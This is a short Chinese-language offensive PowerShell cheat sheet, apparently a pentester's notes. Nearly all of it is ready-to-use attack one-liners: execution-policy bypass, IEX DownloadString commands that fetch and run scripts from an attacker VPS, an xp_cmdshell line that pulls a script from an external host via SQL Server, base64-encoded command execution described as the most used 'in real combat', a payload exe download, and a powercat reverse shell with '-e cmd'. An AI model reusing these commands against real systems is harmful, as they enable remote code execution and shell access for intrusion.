<a name="EvZI5"></a>
# <br />
**本地绕过权限执行**powershell.exe -exec bypass -file ./aufeng.ps1<br /> <br />**远程绕过权限执行**#cmd窗口执行以下命令<br />`powershell -command IEX `(`New-Object System.Net.Webclient`)`.DownloadString`('vps的ip/aufeng.ps1')<br /> <br />#在powershell窗口执行<br />`IEX `(`New-Object System.Net.Webclient`)`.DownloadString`('http://ip/aufeng.ps1')<br />**Sqlserver执行powershell命令**<br />use master;exec master..xp_cmdshell "powershell -nop -c iex(New-Object Net.WebClient).DownloadString('http://www.sp0n.cf/ms78.ps1')"<br />**powershell执行base64命令**-enc :把ps脚本编码成base64来执行，实战用的最多<br />PS C:\Users\19307> $MYCOMMAND = "whoami"   <br />PS C:\Users\19307> $ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYCOMMAND))<br />PS C:\Users\19307> Write-Output $ENCODED<br />dwBoAG8AYQBtAGkA<br /> <br />powershell -enc base64编码<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611399979876-bb4d8ccf-0c1e-4859-8c15-368598dfdf54.png#align=left&display=inline&height=55&originHeight=160&originWidth=1197&status=done&style=none&width=415)<br /> <br />**powershell下载文件**
```
powershell (new-object system.net.webclient).downloadfile('http://xxx:端口/aufeng.exe','d:/aufeng.exe');
```
 <br /> <br /> <br />**powershell反弹shell**<br />**利用powershell的powercat反弹shell**，但需要翻墙能访问外网才行。<br />#在cmd窗口执行<br />powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c vps的ip -p 8888 -e cmd<br /> <br />#在powershell窗口执行<br />IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c vps的ip -p 8888 -e cmd<br /> 
